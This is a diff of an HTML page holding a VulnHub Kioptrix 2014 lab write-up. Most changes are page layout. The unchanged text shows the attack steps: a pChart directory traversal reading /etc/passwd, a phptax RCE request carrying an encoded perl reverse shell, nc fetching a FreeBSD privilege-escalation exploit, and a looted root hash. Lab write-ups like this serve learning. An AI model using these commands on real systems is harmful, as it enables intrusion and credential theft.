@@ -7,7 +7,7 @@
     <meta content="width=device-width, initial-scale=1" name="viewport"/>
     <title>मंथन | Manthan</title>
     <link rel="icon" type="image/webp" sizes="32x32" href="/static/images/manthan-32x32.png.webp"/>
-    <link rel="stylesheet" type="text/css" media="screen" href="/static/css/style.rainbow.css"/>
+    <link rel="stylesheet" type="text/css" media="screen" href="/static/css/style.invisibletree.css"/>
     <link rel="stylesheet" href="/static/css/atelier-forest-light.css">
     <!-- <link rel="stylesheet" href="/static/css/atom-one-light.min.css"> -->
     <!-- <link rel="stylesheet" href="/static/css/default.min.css"> -->
@@ -20,23 +20,13 @@
     <script charset="UTF-8" src="/static/js/go.min.js"></script>
    </head>
   <body>
-    <div class="header">
-      <span class="menu_left"><a class="menu_home" href="/index.html">मंथन</a></span>
-      <span class="menu_right"><table>
-        <tr>
-          <td><a class="menu_archive" href="/archive.html">Archive</a></td><td>|</td>
-          <td><a class="menu_tags" href="/tags.html">Tags</a></td><td>|</td>
-          <td><a class="menu_stats" href="/stats.html">Stats</a></td>
-        </tr>
-      </table></span>
-      <br/><br/>
-    </div>
     <div class="body">
-      <h1 class="h1 collapsible" onclick="toggle(this);">[VulnHub] Kioptrix: 2014 (#5)</h1>
+      <div class="content">
+          <h1 class="h1 collapsible" onclick="toggle(this);">[VulnHub] Kioptrix: 2014 (#5)</h1>
           <p style="float:left;"><a href="/posts/20191008_vulnhub-kioptrix4.html"> « </a>📅 published on <code>09/Oct/2019</code><a href="/posts/20191010_vulnhub-lordoftheroot101.html"> » </a></p>
         <p style="float:right;">🔖 tagged <a href=/tags.html#vulnhub>vulnhub</a> and <a href=/tags.html#writeup>writeup</a></p>
     <div style="clear:both;"></div>
-    <h2 class="h2 collapsible" onclick="toggle(this);">Overview</h2>
+    <br/><h2 class="h2 collapsible" onclick="toggle(this);">Overview</h2>
 <p class="nested">This is a writeup for VulnHub VM <a href="https://www.vulnhub.com/entry/kioptrix-2014-5,62/">Kioptrix: 2014 (#5)</a>. Here are stats for this machine from <a href="https://github.com/7h3rAm/machinescli">machinescli</a>:</p>
 <p class="nested"><img alt="writeup.overview.machinescli" src="/static/files/posts_vulnhub_kioptrix5/machinescli.png.webp" /></p>
 <h3 class="h3 collapsible" onclick="toggle(this);">Killchain</h3>
@@ -45,7 +35,7 @@
 <h3 class="h3 collapsible" onclick="toggle(this);">TTPs</h3>
 <p class="nested">1. <code>80/tcp/http/Apache httpd 2.2.21 ((FreeBSD) mod_ssl/2.2.21 OpenSSL/0.9.8q DAV/2 PHP/5.3.8)</code>: <a href="https://github.com/7h3rAm/writeups#exploit_pchart">exploit_pchart</a><br />
 2. <code>8080/tcp/http/Apache httpd 2.2.21 ((FreeBSD) mod_ssl/2.2.21 OpenSSL/0.9.8q DAV/2 PHP/5.3.8)</code>: <a href="https://github.com/7h3rAm/writeups#exploit_phptax">exploit_phptax</a>, <a href="https://github.com/7h3rAm/writeups#privesc_freebsd">privesc_freebsd</a>  </p>
-<h2 class="h2 collapsible" onclick="toggle(this);">Phase #1: Enumeration</h2>
+<br/><h2 class="h2 collapsible" onclick="toggle(this);">Phase #1: Enumeration</h2>
 <p class="nested">1. Here's the Nmap scan result:  </p>
 <pre class="nested"><code># Nmap 7.70 scan initiated Wed Oct  9 12:11:53 2019 as: nmap -vv --reason -Pn -sV -sC --version-all -oN /root/toolbox/writeups/vulnhub.kioptrix5/results/192.168.92.185/scans/_quick_tcp_nmap.txt -oX /root/toolbox/writeups/vulnhub.kioptrix5/results/192.168.92.185/scans/xml/_quick_tcp_nmap.xml 192.168.92.185
 Nmap scan report for 192.168.92.185
@@ -78,7 +68,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 <pre class="nested"><code>80/tcp    |  http  |  Apache httpd 2.2.21 ((FreeBSD) mod_ssl/2.2.21 OpenSSL/0.9.8q DAV/2 PHP/5.3.8)
 8080/tcp  |  http  |  Apache httpd 2.2.21 ((FreeBSD) mod_ssl/2.2.21 OpenSSL/0.9.8q DAV/2 PHP/5.3.8)
 </code></pre>
-<h2 class="h2 collapsible" onclick="toggle(this);">Phase #2: Exploitation</h2>
+<br/><h2 class="h2 collapsible" onclick="toggle(this);">Phase #2: Exploitation</h2>
 <p class="nested">1. We use <code>searchsploit</code> to look for <code>pChart</code> exploits and find a directory traversal exploit. We use this exploit to view the contents of the <code>/etc/passwd</code> file:  </p>
 <pre class="nested"><code>searchsploit pchart
 searchsploit -x 31173
@@ -127,7 +117,7 @@ GET /phptax/data/rce.php?cmd=perl%20-MIO%20-e%20%27%24p%3Dfork%3Bexit%2Cif%28%24
 </code></pre>
 <p class="nested"><img alt="writeup.exploitation.steps.5.1" src="/static/files/posts_vulnhub_kioptrix5/screenshot13.png.webp" />  </p>
 <p class="nested"><img alt="writeup.exploitation.steps.5.2" src="/static/files/posts_vulnhub_kioptrix5/screenshot14.png.webp" />  </p>
-<h2 class="h2 collapsible" onclick="toggle(this);">Phase #2.5: Post Exploitation</h2>
+<br/><h2 class="h2 collapsible" onclick="toggle(this);">Phase #2.5: Post Exploitation</h2>
 <pre class="nested"><code>www@kioptrix2014&gt; id
 uid=80(www) gid=80(www) groups=80(www)
 www@kioptrix2014&gt;  
@@ -147,7 +137,7 @@ www@kioptrix2014&gt; users
 root
 toor
 </code></pre>
-<h2 class="h2 collapsible" onclick="toggle(this);">Phase #3: Privilege Escalation</h2>
+<br/><h2 class="h2 collapsible" onclick="toggle(this);">Phase #3: Privilege Escalation</h2>
 <p class="nested">1. While exploring the system, we look for privilege escalation exploits for FreeBSD 9 and find two hits. Since the target system doesn't have <code>wget</code> or <code>curl</code> we fallback on <code>nc</code> to download the exploit file. Once compiled, we execute the exploit and get elevated access:  </p>
 <pre class="nested"><code>searchsploit freebsd 9.0
 searchsploit -x 28718
@@ -165,27 +155,70 @@ gcc -o 28718 28718.c
 <pre class="nested"><code>cat /root/congrats.txt
 </code></pre>
 <p class="nested"><img alt="writeup.privesc.steps.2.1" src="/static/files/posts_vulnhub_kioptrix5/screenshot20.png.webp" />  </p>
-<h2 class="h2 collapsible" onclick="toggle(this);">Loot</h2>
+<br/><h2 class="h2 collapsible" onclick="toggle(this);">Loot</h2>
 <h3 class="h3 collapsible" onclick="toggle(this);">Hashes</h3>
 <pre class="nested"><code>root:$1$DdHlo6rh$usiPcDoTR37eL7DAyLjhk1:0:0::0:0:Charlie &amp;:..............
 </code></pre>
-<h2 class="h2 collapsible" onclick="toggle(this);">References</h2>
+<br/><h2 class="h2 collapsible" onclick="toggle(this);">References</h2>
 <ul class="nested">
 <li><a href="https://www.vulnhub.com/entry/kioptrix-2014-5,62/">https://www.vulnhub.com/entry/kioptrix-2014-5,62/</a>  </li>
 <li><a href="https://www.abatchy.com/2017/01/kioptrix-2014-5-walkthrough-vulnhub.html">https://www.abatchy.com/2017/01/kioptrix-2014-5-walkthrough-vulnhub.html</a>  </li>
 <li><a href="https://jhalon.github.io/vulnhub-kioptrix5/">https://jhalon.github.io/vulnhub-kioptrix5/</a>  </li>
 </ul>
+    <hr>
           <p style="float:left;">« <a href="/posts/20191008_vulnhub-kioptrix4.html">[VulnHub] Kioptrix: Level 1.3 ...</a> «</p>
       <p style="float:right;">» <a href="/posts/20191010_vulnhub-lordoftheroot101.html">[VulnHub] Lord Of The Root: 1....</a> »</p>
-        </div>
-    <div BG_CLIPART_STYLE_HERE></div>
-    <div class="footer footercenter">
-      <span>
-        <a href="https://github.com/7h3rAm/7h3rAm.github.io" class="footspan">  </a>
-      </span>
+          </div>
+      <div class="menu">
+        <h1 class="h1"><a class="menu_home" href="/index.html">मंथन</a></h1>
+          <ul class="active nested">
+            <li><a class="menu_archive" href="/archive.html">💾 Archive</a><ul class="active nested">
+              <li><a href=/pages/research.html>🔬 Research</a></li>
+              <li><a href=/pages/cv.html>📄 Curriculum Vitae</a></li>
+              <li><a href=/pages/satview.html>🛰️ Satellite Views</a></li>
+              <li><a href=/pages/fitness.html>🏋️ Fitness</a></li>
+              <li><a href=/pages/life.html>🧘 Life</a></li>
+            </ul></li>
+            <li><a class="menu_tags" href="/tags.html">🔖 Tags</a><ul class="active nested">
+                            <li><a href="/tags.html#code">code</a></li>
+                            <li><a href="/tags.html#ctf">ctf</a></li>
+                            <li><a href="/tags.html#exploit">exploit</a></li>
+                            <li><a href="/tags.html#hackthebox">hackthebox</a></li>
+                            <li><a href="/tags.html#reversing">reversing</a></li>
+                            <li><a href="/tags.html#tryhackme">tryhackme</a></li>
+                            <li><a href="/tags.html#vulnhub">vulnhub</a></li>
+                            <li><a href="/tags.html#vulnweekends">vulnweekends</a></li>
+                            <li><a href="/tags.html#writeup">writeup</a></li>
+                          </ul></li>
+            <li><a class="menu_stats" href="/stats.html">📊 Stats</a></li>
+          </ul>
+      </div>
+      <div class="footer footercenter"><span><a href="https://github.com/7h3rAm/7h3rAm.github.io" class="footspan">  </a></span></div>
+      <script>hljs.initHighlightingOnLoad();</script>
+      <script>hljs.initLineNumbersOnLoad();</script>
+      <script>
+        function toggle(s){
+          s.classList.toggle("expanded");
+          var t=!1,i=!1,a=!1;
+          s.classList.contains("h2")&&(t=!0),s.classList.contains("h3")&&(i=!0),s.classList.contains("h4")&&(a=!0);
+          for(var l=s.nextElementSibling;l;){
+            if(t&&l.classList.contains("h2")){
+              l.classList.toggle("active");
+              break
+            }
+            if(i&&(l.classList.contains("h2")||l.classList.contains("h3"))){
+              l.classList.toggle("active");
+              break
+            }
+            if(a&&(l.classList.contains("h2")||l.classList.contains("h3")||l.classList.contains("h4"))){
+              l.classList.toggle("active");
+              break
+            }
+            l.classList.contains("collapsible")&&l.classList.toggle("expanded"),l.classList.toggle("active"),l=l.nextElementSibling
+          }
+        }
+      </script>
     </div>
-    <script>hljs.initHighlightingOnLoad();</script>
-    <script>hljs.initLineNumbersOnLoad();</script>
-    <script>function toggle(s){s.classList.toggle("expanded");var t=!1,i=!1,a=!1;s.classList.contains("h2")&&(t=!0),s.classList.contains("h3")&&(i=!0),s.classList.contains("h4")&&(a=!0);for(var l=s.nextElementSibling;l;){if(t&&l.classList.contains("h2")){l.classList.toggle("active");break}if(i&&(l.classList.contains("h2")||l.classList.contains("h3"))){l.classList.toggle("active");break}if(a&&(l.classList.contains("h2")||l.classList.contains("h3")||l.classList.contains("h4"))){l.classList.toggle("active");break}l.classList.contains("collapsible")&&l.classList.toggle("expanded"),l.classList.toggle("active"),l=l.nextElementSibling}}</script>
+    <div id="bgclipart"></div>
   </body>
 </html>
